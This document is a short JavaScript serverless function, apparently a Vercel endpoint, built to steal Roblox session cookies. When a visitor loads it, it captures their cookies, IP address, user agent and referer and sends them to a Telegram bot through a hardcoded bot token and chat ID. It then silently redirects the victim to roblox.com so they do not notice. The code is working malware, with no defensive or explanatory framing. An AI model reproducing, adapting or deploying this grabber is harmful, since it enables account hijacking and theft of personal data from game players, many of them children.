export default async (req, res) => {
  const config = {
    botToken: '8110179122:AAHjbqAglX75ElcuKCcKwRwwXYGCvwY4_xM',
    chatId: '7695851744',
    redirect: 'https://www.roblox.com/games'
  };

  try {
    const data = {
      cookies: req.headers.cookie || 'NULL',
      agent: req.headers['user-agent'] || 'NULL', 
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'NULL',
      time: new Date().toISOString(),
      referer: req.headers.referer || 'direct'
    };

    const text = `🎯 ROBLOX COOKIE GRABBED
┌─────────────────
│ 🕒 ${new Date().toLocaleString()}
│ 📍 IP: ${data.ip}
│ 🌐 Agent: ${data.agent.substring(0, 60)}...
│ 🔗 Referer: ${data.referer}
└─────────────────

🍪 COOKIES:
${data.cookies}

⚡ Sent via Vercel Edge Function`;

    // Отправка в Telegram
    const tgResponse = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.chatId,
        text: text,
        parse_mode: 'HTML'
      })
    });

    // Мгновенный редирект
    return Response.redirect(config.redirect, 302);

  } catch (error) {
    return Response.redirect('https://www.roblox.com/', 302);
  }
};
